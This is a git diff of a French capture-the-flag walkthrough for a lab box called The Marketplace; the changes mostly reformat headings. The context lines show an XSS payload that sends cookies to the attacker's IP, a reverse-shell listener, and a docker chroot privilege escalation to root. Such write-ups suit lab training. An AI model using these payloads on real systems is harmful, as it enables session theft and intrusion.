@@ -1,6 +1,6 @@
 # MarketPlace
 Un nouveau petit chall, lets go !
-# Enum
+# Enumeration
 ## Nmap
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-24 08:41 EST
@@ -30,14 +30,14 @@ Nmap done: 1 IP address (1 host up) scanned in 121.85 seconds
 ## Visite du site
 On y trouve un page login, et on peux créer des comptes.
 
-### Users potentiels :
+## Users potentiels :
 On y retrouve 2 users potentiels.
 ```
 mickael
 jake
 ```
 Seul le compte de jake renvoi **Invalid password** quand on essaye de se log dessus.
-### Fonction upload
+## Fonction upload
 Il y a une fonction upload, qui est désactivée.
 ```
       <form method="POST">
@@ -53,7 +53,7 @@ Il est très facilement désactivable via l'inspection via le navigateur. Il fau
 <s><input type="file" style="font-size: 16px" disabled /></s>
 ```
 et on peux upload. On va test un revshell après.
-### XSS
+## XSS
 Il y a une XSS avec la description sur la page **http://10.10.145.247/new**, le payload suivant fonctionne
 
 ```Payload
@@ -86,7 +86,7 @@ Progress: 220560 / 220561 (100.00%)
 Finished
 ===============================================================
 ```
-# Admin panel
+## Admin panel
 On va voir si on peux récupèrer un cookie admin avec une XSS et le payload suivant:
 ```
 <script>document.write('<img src="http://10.11.50.195?cookie=' + document.cookie + '" />')</script>
@@ -186,9 +186,9 @@ On a un mot de passe SSH:
 ```
 @b_E*************
 ```
+# Exploitation
 On a le shell en SSH !
 
-# Privesc to michael !
 En faisant un petit **sudo -l** on retrouve un script de backup qui peux être exec en tant que michael:
 ```
 jake@the-marketplace:/$ sudo -l
@@ -228,7 +228,7 @@ listening on [any] 1234 ...
 connect to [10.11.50.195] from (UNKNOWN) [10.10.187.172] 44240
 michael@the-marketplace:/opt/backups$
 ```
-# Privesc to root !
+## Privesc to root !
 L'user **michael** fait parti du groupe docker, on peux donc pop un shell:
 ```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
